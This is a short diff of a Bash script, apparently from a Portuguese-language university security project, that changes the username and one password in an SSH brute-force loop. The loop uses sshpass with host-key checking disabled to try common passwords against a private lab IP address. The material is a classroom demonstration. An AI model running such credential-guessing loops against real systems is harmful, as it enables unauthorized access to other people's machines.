@@ -3,13 +3,13 @@
 # Demo Vulnerabilidades - Trabalho Final Segurança
 
 TARGET="192.168.3.216"
-USER="professor"
+USER="apolo"
 
 echo "🔴 Demonstrando vulnerabilidades críticas..."
 
 # 1. SSH Brute Force
 echo "[1] SSH Brute Force Attack"
-for pwd in "123456" "password" "admin"; do
+for pwd in "123456789" "password" "admin"; do
     echo "  Testando: $pwd"
     if sshpass -p "$pwd" ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no \
        $USER@$TARGET "echo 'ACESSO OBTIDO'" 2>/dev/null; then
